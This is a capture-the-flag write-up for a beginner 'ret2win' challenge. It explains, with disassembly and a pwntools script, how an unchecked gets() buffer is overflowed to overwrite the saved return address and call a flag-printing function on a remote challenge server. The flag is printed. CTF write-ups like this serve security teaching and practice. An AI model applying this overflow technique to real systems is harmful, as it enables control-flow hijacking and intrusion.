# Returning to Winning

## Description
A simple pwn challenge

Flag Format: 0CTF{}

## Flag

```
0CTF{r3t2w!n_c4n_b3_v3ry_e4sy}
```

## Solution

On decompiling (dogbolt.org) the `c` ELF file, we get `c_HexRays.c`. The challenge can be solved using a simple buffer overflow exploit that overwrites the return address stored on the stack (rip register).

We can confirm this from the `c.s` file which we get using `objdump -d c > c.s`.

It gives:

```asm
; gets call
  40125b:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
  40125f:	48 89 c7             	mov    %rax,%rdi
  401262:	b8 00 00 00 00       	mov    $0x0,%eax
  401267:	e8 14 fe ff ff       	call   401080 <gets@plt>
```

So, it confirms the memory layout of the char array. It is like `... | 64 byte char array | rbp | rip | ...` on the stack.

We can overwrite the `rip` with the return address of the function which we can get from the `c_HexRays.c` file and verify in the `c.s` file.

```asm
; win function
  401196:	55                   	push   %rbp
  401197:	48 89 e5             	mov    %rsp,%rbp
  40119a:	48 83 ec 10          	sub    $0x10,%rsp
  40119e:	48 8d 05 63 0e 00 00 	lea    0xe63(%rip),%rax        # 402008 <fopen@plt+0xf68>
  4011a5:	48 89 c7             	mov    %rax,%rdi
  4011a8:	e8 93 fe ff ff       	call   401040 <puts@plt>
  ...
```

```c
//----- (0000000000401196) ----------------------------------------------------
int sub_401196() {
	char v1;      // [rsp+7h] [rbp-9h]
	FILE *stream; // [rsp+8h] [rbp-8h]
    ...
```

The address is `0x401196`.

We can do all this using a simple pwntools script.

```py
from pwn import *


r = remote("13.232.34.171", 32644)
r.recvuntil(b"return.")

addr = 0x401196
addr_repr = addr.to_bytes(8, "little")

# Fill the array and the stored rbp register value with padding data.
# Overwrite the saved rip register with the address of the subroutine that prints the flag.
r.send(b"A" * (0x40 + 8) + addr_repr + b"\n")
print(r.recvall())
```

The output after running this gives:

```
$ python solve.py 
[+] Opening connection to 13.232.34.171 on port 32644: Done
[+] Receiving all data: Done (102B)
[*] Closed connection to 13.232.34.171 port 32644
b"Congratulations! You've called the win function.\nContents of flag.txt:\n0CTF{r3t2w!n_c4n_b3_v3ry_e4sy}\n"https://dogbolt.org/?id=1423efe5-0a25-4e41-8fef-bfbbbf03f57d#Hex-Rays=154
```

## References

## Attachments

- [challenge](https://drive.google.com/file/d/1oDxvAT8tgE_o7W2qTZAosTlfBQ2gLjar/view)
